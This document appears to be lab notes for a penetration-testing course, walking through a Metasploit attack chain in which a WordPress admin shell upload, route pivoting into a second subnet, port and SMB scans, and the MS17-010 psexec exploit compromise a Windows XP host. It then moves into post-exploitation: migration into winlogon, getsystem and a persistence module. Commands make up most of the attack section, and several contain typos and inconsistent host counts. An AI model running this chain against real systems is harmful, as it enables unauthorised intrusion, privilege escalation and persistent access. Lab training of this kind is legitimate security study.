# Routing and Pivoting

We have 3 machines: Pentesting, Beta and Windows XP.

Pentesting is in the range of 100.
Beta is in the range of 100 and 148.
Windows XP is in the range of 148.

## Pivoting with the first machine

Basically, we'll use the Beta machine to enter the 148 range.

```bash
ping beta.hackerinthehouse.com
msfconsole
use exploit/unix/webapp/wp_admin_shell_upload
show options
set PASSWORD password
set USERNAME username
set RHOSTS url
run
```

Now the shell is opened.

We can backgroung it by typing `ctrl+Z`.

```bash
sessions
```

This shows us the sessions opened.

```bash
sessions -i 1
shell
```

This allow us to use the shell of the webserver.

```bash
ifconfig
```

## Finding opened ports

Now we can exit the shell and stay in the meterpreter.
We background it and use ping_sweep (post exploitation tool).

```bash
search ping_sweep
use pose/multi/gather/ping_sweep
set RHOSTS 10.0.148.0/24
set SESSION 1
run
```

We receive 3 hosts:

- 10.0.148.1
- 10.0.148.3
- 10.0.148.2
- 10.0.148.84
- 10.0.148.111

## Creating a custom route

Let's select 10.0.148.84
We now need to setup a manual route.
There are two way, inside or outside of meterpreter.
We'll use the indide method.

```bash
exit
route -h
# search what is a subnet, etc..
route add 10.0.148.0 255.255.255.0 1
```

```bash
route print
```

This is our routing table.

```bash
Subnet            Netmask            Gateway
------            -------            -------
10.0.148.0        255.255.255.0      Session 1
```

You can now run any exploit or scanner and that will go to this route.

### Finding ports from the 148 range

Let's look for a portscan auxiliary.

```bash
search scanner
user auxiliary/scanner/portscan/tcp
show options
set RHOSTS 10.0.148.84
set PORTS 1-500
run
```

We get 3 open ports.

- 10.0.148.84.135
- 10.0.148.84.139
- 10.0.148.84.445

Now we can go back to the options and change the `set PORTS to 500-1000`.

## Scanning the SMB port

The port 445 is an SMB port, we could try to use a SMB scanner.

```bash
background
search smb
```

We'll have to detect the version of SMB. Then find users, shares and domains.

```bash
use auxiliary/scanner/smb/smb1
set RHOSTS 10.0.148.84
run
```

We see that this hosts supports SMBv1.
We can go ahead and search for the v2.

```bash
use auxiliary/scanner/smb/smb2
set RHOSTS 10.0.148.84
run
```

This time there aren't any output.
This is common with auxiliaries, you won't get output if there aren't outputs.

```bash
search smb_enum
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 10.0.148.84
run
```

There aren't any output - might be because it's secure enough that it won't give us the users.
Let's find an exploit for smb v1.

```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.0.148.84
run
```

This finds us the Windows WP version.

## Finding other exploits

```bash
search type:expoit xp
```

There are almost 2000 exploits.
`ms08_067_netapi` is a very common one.

```bash
use exploit/windows/smb/ms08_067_netapi
info
set RHOSTS 10.0.148.84
check
```

It says that the target is not exploitable.
We can try another id.

```bash
set TARGET 6
check
```

It says that the target is not exploitable.

```bash
set TARGET 7
check
```

It says that the target is not exploitable.
It's not going to work.
We'll try eternalblue.

```bash
search eternal
use exploit/windows/smb/ms17_010_eternalblue
show options
```

That won't work because it isn't Windows 7 and Server 2008 R2 (x64)
Let's try the psexec exploit.

```bash
search eternal
use exploit/windows/smb/ms17_010_psexec
show options
set RHOSTS 10.0.148.84
check
```

The target is vunlerable!

## Entering the machine

```bash
exploit
background
sessions -i 2
```

We are now in meterpreter, inside the windows XP machine.

```bash
help
ps
```

`ps` will show you the processes running in that machine.

## Migrating between processes

```bash
migrate 644
```

We are now running as the winlogon process. That means that we won't be out until the user restarts the system.

```bash
screenshot
```

That takes a screen shots and saves it in kali.

```bash
getsystem
getprivs
background
```

`getsystem` will escalate us to the most powerful user.
`getprivs` will show us our privileges.

## Using persistence

```bash
use post/windows/manager/persistence_exe
show options
```

Persistence allow us to store the meterpreter in the memory.
In real life testing, it could go on during months.
You'll need to store your connexions.

```bash
run persistence -h
exit
```
